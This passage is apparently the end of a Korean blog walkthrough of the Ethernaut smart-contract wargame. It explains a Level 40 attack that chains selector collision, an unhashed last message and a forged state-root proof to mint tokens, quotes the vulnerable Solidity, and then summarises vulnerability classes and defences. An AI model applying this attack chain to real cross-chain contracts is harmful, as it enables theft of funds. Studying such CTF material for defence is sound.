첫 메시지로 selector collision을 이용해 helper를 owner로 만들고, 해시에 포함되지 않는 마지막 메시지로 helper를 호출한다. helper는 새 state root를 담은 RLP block header를 제출하고 소유권·sequencer를 조정한다. 그 사이 단일 leaf storage trie와 account trie를 구성해 withdrawal slot 값 `0x01`에 대한 proof를 만든다. 마지막에 `executeMessage()` 검증이 공격 중 갱신된 root를 보게 하면 토큰이 민팅된다.

독립 PoC의 테스트에서 마지막 원소만 바꾼 두 메시지의 slot hash가 완전히 같고 takeover 경로가 실행되는 것을 확인했다.

```text
Hash 1: 0xbfa6...51f1c
Hash 2: 0xbfa6...51f1c
Bug verified: _computeMessageSlot skips the last element
```

방어하려면 proof를 먼저 검증하고 상태를 고정한 다음 외부 실행을 해야 한다. 배열 전체를 해시에 포함하고, selector만 비교하지 말고 정확한 ABI와 목적지를 검증해야 한다.

#### 풀이 과정

1. selector collision으로 ownership을 바꾸고 해시에서 빠지는 마지막 메시지로 state root를 갱신한 뒤 조작한 trie proof를 통과시킨다.

#### 익스플로잇 / 검증 코드

```solidity
// 핵심 결함 1: 마지막 원소가 commitment에서 빠진다.
for (uint i; i < _messageReceivers.length - 1; i++) {
    messageReceiversAccumulatedHash = keccak256(abi.encode(messageReceiversAccumulatedHash, _messageReceivers[i]));
}

// 핵심 결함 2: 검증보다 외부 실행이 먼저다.
_executeOperation(_messageReceivers[i], _messageData[i], false);
_verifyMessageInclusion(...);
```

#### 풀이 완료 확인

![Level 40 NotOptimisticPortal 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-40-notoptimisticportal.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

verify-before-execute, 전체 배열 commitment, 정확한 ABI 검증을 적용한다.

## 9. 전체 취약점 지도

| 범주 | 대표 레벨 | 핵심 방어 |
|---|---|---|
| 접근 제어/호출 문맥 | Fallback, Telephone, Delegation | 명시적 role, `msg.sender`, 안전한 proxy |
| 산술/타입/ABI | Token, HigherOrder, Switch | checked math, canonical decoding |
| 저장소 | Vault, Privacy, Alien Codex | 비밀을 온체인에 두지 않기, layout 검증 |
| 외부 호출/DoS | King, Re-entrancy, Denial | CEI, pull payment, 실패 격리 |
| 가격·회계 | Dex, Dex Two, Stake, Bet House | 불변식, allowlist, 실제 수령량 검증 |
| 프록시/업그레이드 | Puzzle Wallet, Motorbike | EIP-1967 슬롯, 구현체 초기화 잠금 |
| 서명 | Impersonator, Elliptic Token, Forger | low-s, EIP-712, nonce/digest replay 방지 |
| 계정 추상화 | Cashback, UniqueNFT | EOA/컨트랙트 이분법 제거 |
| Cross-chain proof | NotOptimisticPortal | verify-before-execute, 전체 메시지 commitment |

## 10. 마치며

초반은 `private` 값을 읽고 fallback을 호출하는 정도였지만 뒷문제로 갈수록 시스템이 믿고 있는 불변식으로 이동했다. 밑 네 가지를 주의하자... 

- 외부 호출은 상대에게 제어권을 넘기는 일이다.
- 검증한 데이터와 실제 실행한 데이터가 정확히 같아야 한다.
- 서명은 raw bytes가 아니라 의도, 도메인, nonce를 묶어 검증해야 한다.
- EIP-7702 이후 `tx.origin == msg.sender`, `code.length == 0` 같은 EOA 판별은 보안 경계가 아니다.

## 참고 자료

- [The Ethernaut](https://ethernaut.openzeppelin.com/)
- [OpenZeppelin Ethernaut 공식 저장소](https://github.com/OpenZeppelin/ethernaut)
- [Ethernaut Community Solutions](https://forum.openzeppelin.com/t/ethernaut-community-solutions/561)
- [EIP-2098: Compact Signature Representation](https://eips.ethereum.org/EIPS/eip-2098)
- [EIP-7702: Set Code for EOAs](https://eips.ethereum.org/EIPS/eip-7702)
- [EIP-6780: SELFDESTRUCT only in same transaction](https://eips.ethereum.org/EIPS/eip-6780)